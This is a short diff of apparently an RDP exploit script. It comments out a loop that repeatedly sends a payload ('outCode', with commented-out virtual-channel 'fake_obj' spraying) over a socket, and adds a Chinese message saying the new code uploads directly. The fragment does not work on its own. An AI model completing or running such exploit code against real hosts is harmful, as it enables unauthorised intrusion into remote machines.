@@ -188,20 +188,20 @@ def main():
 
     print("正在使用新代码 直接上传")
     # print('[+] allocating fake objects')
-    while count < times:
+    # while count < times:
 
-        count += 1
-        #print('time through %d' % count)
+    #     count += 1
+    #     #print('time through %d' % count)
 
-        try:
+    #     try:
 
-            # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
-            # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, outCode))
-            s.sendall(outCode)
+    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
+    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, outCode))
+    #         s.sendall(outCode)
 
-        except ConnectionResetError:
+    #     except ConnectionResetError:
 
-            s.close()
+    #         s.close()
 
     s.close()
 
